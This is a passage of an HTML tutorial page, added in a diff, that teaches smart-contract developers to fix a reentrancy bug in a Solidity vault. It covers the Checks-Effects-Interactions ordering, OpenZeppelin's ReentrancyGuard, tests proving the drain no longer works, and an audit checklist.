+
+    <!-- FIX CEI -->
+    <section id="fix-cei" class="section">
+      <div class="section-label">Step 5</div>
+      <h2 class="section-title">Fix #1 — Checks-Effects-Interactions</h2>
+
+      <div class="section-text">
+        <p>
+          The simplest correct fix is to update state before any external call.
+          Edit withdraw accordingly:
+        </p>
+
+        <pre><button class="copy-btn">Copy</button><code>function withdraw(uint256 amount) external {
+    require(balances[msg.sender] &gt;= amount, "insufficient");
+
+    // ✅ EFFECTS first
+    balances[msg.sender] -= amount;
+
+    // ✅ INTERACTION last
+    (bool ok,) = msg.sender.call{value: amount}("");
+    require(ok, "send failed");
+
+    emit Withdraw(msg.sender, amount);
+}</code></pre>
+
+        <p>Now attacker re-entry fails because their stored balance is already reduced.</p>
+
+        <div class="note">
+          <div class="tip-title">CEI is a mindset</div>
+          <p>
+            Always ask yourself: “Can any external call happen before I lock in critical state?”
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- FIX TEST -->
+    <section id="fix-tests" class="section">
+      <div class="section-label">Step 6</div>
+      <h2 class="section-title">Update tests to prove the fix</h2>
+
+      <div class="section-text">
+        <p>
+          Modify your test to expect revert or non-drain after CEI fix:
+        </p>
+
+        <pre><button class="copy-btn">Copy</button><code>it("no longer drains after CEI fix", async function () {
+  const { vault, attacker, alice, bob, attackerEOA } = await deployFixture();
+
+  await vault.connect(alice).deposit({ value: ethers.parseEther("5") });
+  await vault.connect(bob).deposit({ value: ethers.parseEther("5") });
+
+  await expect(
+    attacker.connect(attackerEOA).attack({ value: ethers.parseEther("1") })
+  ).to.be.reverted; // reentrant withdraw breaks
+
+  expect(await vault.vaultBalance()).to.equal(ethers.parseEther("10"));
+});</code></pre>
+
+        <p>Run tests again.</p>
+      </div>
+    </section>
+
+    <!-- FIX GUARD -->
+    <section id="fix-guard" class="section">
+      <div class="section-label">Step 7</div>
+      <h2 class="section-title">Fix #2 — ReentrancyGuard (belt + suspenders)</h2>
+
+      <div class="section-text">
+        <p>
+          CEI fixes the root bug. But in complex contracts,
+          developers still add a guard as a backstop.
+        </p>
+
+        <p>Install OpenZeppelin if not installed:</p>
+        <pre><button class="copy-btn">Copy</button><code>npm install @openzeppelin/contracts</code></pre>
+
+        <p>Then update vault:</p>
+
+        <pre><button class="copy-btn">Copy</button><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+contract EtherVault is ReentrancyGuard {
+    mapping(address =&gt; uint256) public balances;
+
+    event Deposit(address indexed user, uint256 amount);
+    event Withdraw(address indexed user, uint256 amount);
+
+    function deposit() external payable {
+        require(msg.value &gt; 0, "zero deposit");
+        balances[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
+    }
+
+    function withdraw(uint256 amount) external nonReentrant {
+        require(balances[msg.sender] &gt;= amount, "insufficient");
+
+        balances[msg.sender] -= amount;
+
+        (bool ok,) = msg.sender.call{value: amount}("");
+        require(ok, "send failed");
+
+        emit Withdraw(msg.sender, amount);
+    }
+
+    function vaultBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}</code></pre>
+
+        <div class="tip">
+          <div class="tip-title">What nonReentrant does</div>
+          <p>
+            It adds a storage lock. If the function is entered again
+            before completion, it reverts immediately.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- CASES WHERE CEI IS NOT ENOUGH -->
+    <section id="cei-not-enough" class="section">
+      <div class="section-label">Advanced cases</div>
+      <h2 class="section-title">When CEI is not enough</h2>
+
+      <div class="section-text">
+        <p>
+          CEI protects a single function’s ordering.
+          But reentrancy can sneak through:
+        </p>
+
+        <ul>
+          <li><b>Cross-function reentrancy</b> — attacker re-enters via another public function.</li>
+          <li><b>External hooks</b> (ERC-777, ERC-1155 receiver callbacks).</li>
+          <li><b>Proxy / upgrade patterns</b> where logic is distributed.</li>
+          <li><b>State shared across modules</b> (libraries, facets).</li>
+        </ul>
+
+        <div class="accordion">
+          <div class="accordion-header">Cross-function example <span>open</span></div>
+          <div class="accordion-body">
+            <p>
+              If function A updates balance then calls out safely,
+              but attacker re-enters into function B that still relies on “old” assumptions,
+              you’re still toast. This is why guards are common in DeFi.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- EXTRA HARDENING -->
+    <section id="extra-hardening" class="section">
+      <div class="section-label">Step 8</div>
+      <h2 class="section-title">Extra hardening patterns</h2>
+
+      <div class="section-text">
+        <h3>1. Pull over push</h3>
+        <p>
+          Instead of pushing ETH immediately, record credits and let users withdraw later.
+          (We already do that.) Never “auto-send” ETH inside loops.
+        </p>
+
+        <h3>2. Limit reentrancy surface</h3>
+        <ul>
+          <li>Mark sensitive functions <span class="inline-code">nonReentrant</span>.</li>
+          <li>Make internal helpers <span class="inline-code">private</span> if not needed outside.</li>
+          <li>Split logic: one function changes state, another performs interaction.</li>
+        </ul>
+
+        <h3>3. Use custom errors</h3>
+        <pre><button class="copy-btn">Copy</button><code>error InsufficientBalance();
+error SendFailed();
+
+function withdraw(uint256 amount) external nonReentrant {
+  if (balances[msg.sender] &lt; amount) revert InsufficientBalance();
+  balances[msg.sender] -= amount;
+  (bool ok,) = msg.sender.call{value: amount}("");
+  if (!ok) revert SendFailed();
+}</code></pre>
+
+        <h3>4. Consider pause switches</h3>
+        <p>
+          If you detect an exploit live, having <span class="inline-code">Pausable</span> can save funds.
+        </p>
+      </div>
+    </section>
+
+    <!-- CHALLENGE -->
+    <section id="challenge" class="section">
+      <div class="section-label">Challenge</div>
+      <h2 class="section-title">Your turn (15-20 min)</h2>
+
+      <div class="section-grid">
+        <div class="section-text">
+          <p>
+            Extend EtherVault:
+          </p>
+          <ul>
+            <li>Add <span class="inline-code">depositFor(address user)</span> that credits someone else.</li>
+            <li>Add an owner-only <span class="inline-code">emergencyWithdraw(address user)</span>.</li>
+            <li>Write tests for both functions.</li>
+            <li>Think about reentrancy implications of the new functions.</li>
+          </ul>
+
+          <div class="note">
+            <div class="tip-title">Hint</div>
+            <p>
+              Mark <span class="inline-code">emergencyWithdraw</span> nonReentrant too.
+              Cross-function attacks are the real “advanced” part.
+            </p>
+          </div>
+        </div>
+
+        <div>
+          <div class="card-soft">
+            <div class="card-title">Done? Verify:</div>
+            <ul class="step-list">
+              <li><span class="checkmark">→</span> No test can drain funds</li>
+              <li><span class="checkmark">→</span> CEI respected everywhere</li>
+              <li><span class="checkmark">→</span> Guards on all external withdraw-like calls</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CHECKLIST -->
+    <section id="final-checklist" class="section">
+      <div class="section-label">Wrap up</div>
+      <h2 class="section-title">Reentrancy audit checklist</h2>
+
+      <div class="section-text">
+        <ul>
+          <li>Any external call (<span class="inline-code">call / transfer / send / ERC hooks</span>) before state update?</li>
+          <li>Any withdraw-like function missing CEI ordering?</li>
+          <li>Multiple external calls in one function? Verify order carefully.</li>
+          <li>Public functions sharing state across modules? Consider cross-function reentrancy.</li>
+          <li>Loops that send ETH/tokens to many users? Prefer pull pattern.</li>
+          <li>Add <span class="inline-code">nonReentrant</span> to critical flows.</li>
+        </ul>
+
+        <div class="tip">
+          <div class="tip-title">Final thought</div>
+          <p>
+            CEI prevents the bug. Guards prevent surprises. Use both in real protocols.
+          </p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div>© 2025 web3.studio — advanced security track: exploits, tests, fixes.</div>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <span>·</span>
+      <a href="../guides.html">All guides</a>
+      <span>·</span>
+      <a href="../docs.html">Docs</a>
+      <span>·</span>
+      <a href="../security.html">Security docs</a>
+    </div>
+  </footer>
+
+  <!-- Progress widget -->
+  <div class="progress" id="progressWidget">
+    <div><strong id="progressPct">0%</strong> · guide progress</div>
+    <div class="progress-bar"><div class="progress-bar-fill" id="progressFill"></div></div>
+    <div class="progress-actions">
+      <div class="progress-btn" id="scrollTopBtn">Top</div>
+      <div class="progress-btn" id="scrollNextBtn">Next</div>
+    </div>
+  </div>
+
+<script>
+  // Copy buttons for pre blocks
+  document.querySelectorAll("pre").forEach(pre => {
+    const btn = pre.querySelector(".copy-btn");
+    if (!btn) return;
+    btn.addEventListener("click", () => {
+      const code = pre.innerText.replace("Copy", "").trim();
+      navigator.clipboard.writeText(code);
+      const old = btn.textContent;
+      btn.textContent = "Copied!";
+      setTimeout(() => (btn.textContent = old), 900);
+    });
+  });
+
+  // Accordions
+  document.querySelectorAll(".accordion").forEach(acc => {
+    const header = acc.querySelector(".accordion-header");
+    header.addEventListener("click", () => {
+      acc.classList.toggle("open");
+    });
+  });
+
+  // Progress calc + Next section navigation
+  const sections = [...document.querySelectorAll("section[id]")];
+  const progressPct = document.getElementById("progressPct");
+  const progressFill = document.getElementById("progressFill");
+  const scrollTopBtn = document.getElementById("scrollTopBtn");
+  const scrollNextBtn = document.getElementById("scrollNextBtn");
+
+  function updateProgress() {
+    const scrollY = window.scrollY;
+    const docH = document.body.scrollHeight - window.innerHeight;
+    const pct = docH > 0 ? Math.min(100, Math.max(0, (scrollY / docH) * 100)) : 0;
+    progressPct.textContent = pct.toFixed(0) + "%";
+    progressFill.style.width = pct.toFixed(0) + "%";
+  }
+  updateProgress();
+  window.addEventListener("scroll", updateProgress);
+
+  scrollTopBtn.addEventListener("click", () => window.scrollTo({ top: 0, behavior: "smooth" }));
+
+  scrollNextBtn.addEventListener("click", () => {
+    const y = window.scrollY + 10;
+    const next = sections.find(s => s.offsetTop > y);
+    if (next) next.scrollIntoView({ behavior: "smooth", block: "start" });
+    else window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });
+  });
+</script>
+
+</body>
+</html>
